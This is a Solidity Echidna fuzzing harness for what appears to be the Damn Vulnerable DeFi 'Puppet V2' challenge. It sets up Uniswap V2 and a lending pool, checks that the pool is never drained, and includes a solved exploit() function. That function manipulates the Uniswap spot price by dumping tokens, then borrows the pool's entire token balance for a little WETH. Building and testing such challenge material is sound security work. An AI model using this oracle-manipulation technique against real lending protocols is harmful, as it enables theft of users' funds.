// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {ERC20Mint} from "src/exchange/ERC20Mint.sol";
import {PuppetV2Pool} from "src/puppet-v2/PuppetV2Pool.sol";
import {DeployCodeHelper} from "./DeployCodeHelper.sol";

contract PuppetV2EchidnaSolved is DeployCodeHelper {

    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;

    IUniswapV2Factory public uniswapFactory;
    IUniswapV2Router02 public router;
    WETH public weth;
    ERC20Mint public token;
    PuppetV2Pool public lendingPool;
    IUniswapV2Pair public uniswapPair;

    address public constant attacker = address(0x30000);
    address public constant recovery = address(0xdeadbeef);
    
    bool public initialized;

    constructor() payable {
        initialized = false;
    }
    
    function setup() public {
        if (initialized) return;
        require(address(this).balance >= UNISWAP_INITIAL_WETH_LIQUIDITY, "Insufficient ETH balance");
        
        // Deploy WETH first
        weth = new WETH();

        // Deploy Uniswap V2 Factory
        uniswapFactory = IUniswapV2Factory(
            deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(this)))
        );
        
        // Deploy Uniswap V2 Router
        router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapFactory), address(weth)))
        );

        // Deploy and mint token
        token = new ERC20Mint("MyToken", "MTK");
        token.mint(address(this), UNISWAP_INITIAL_TOKEN_LIQUIDITY);
        token.mint(attacker, PLAYER_INITIAL_TOKEN_BALANCE);
        token.mint(address(this), LENDING_POOL_INITIAL_TOKEN_BALANCE);
        // Also mint tokens to this contract for the exploit function
        token.mint(address(this), PLAYER_INITIAL_TOKEN_BALANCE);

        // Wrap ETH for liquidity
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();
        
        // Add initial liquidity to Uniswap
        token.approve(address(router), UNISWAP_INITIAL_TOKEN_LIQUIDITY);
        weth.approve(address(router), UNISWAP_INITIAL_WETH_LIQUIDITY);
        
        router.addLiquidity({
            tokenA: address(token),
            tokenB: address(weth),
            amountADesired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
            amountBDesired: UNISWAP_INITIAL_WETH_LIQUIDITY,
            amountAMin: 0,
            amountBMin: 0,
            to: address(this),
            deadline: block.timestamp * 2
        });

        // Get the pair address
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(token), address(weth)));
        require(address(uniswapPair) != address(0), "Pair not created");

        // Deploy lending pool
        lendingPool = new PuppetV2Pool(
            address(weth), 
            address(token), 
            address(uniswapPair), 
            address(uniswapFactory)
        );
        
        // Fund the lending pool
        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);
        
        initialized = true;
    }

    function echidna_pool_not_drained() public returns (bool) {
        if (!initialized) {
            try this.setup() {} catch {
                return true; 
            }
        }
        
        if (address(lendingPool) == address(0) || address(token) == address(0)) {
            return true;
        }
        
        // Pool should maintain its dinitial balance
        return token.balanceOf(address(lendingPool)) >= LENDING_POOL_INITIAL_TOKEN_BALANCE;
    }

    function exploit() public {
        if (!initialized) {
            try this.setup() {} catch {
                return; 
            }
        }
        
        if (address(token) == address(0) || address(router) == address(0) || address(lendingPool) == address(0)) {
            return;
        }
        
        if (token.balanceOf(address(this)) < PLAYER_INITIAL_TOKEN_BALANCE) {
            return;
        }
        
        token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            path,
            address(this),
            block.timestamp + 60
        );

        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
        uint256 amountToBorrow = LENDING_POOL_INITIAL_TOKEN_BALANCE;
        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(amountToBorrow);
        weth.approve(address(lendingPool), wethRequired);
        lendingPool.borrow(amountToBorrow);
        token.transfer(recovery, amountToBorrow);
    }

    receive() external payable {}
}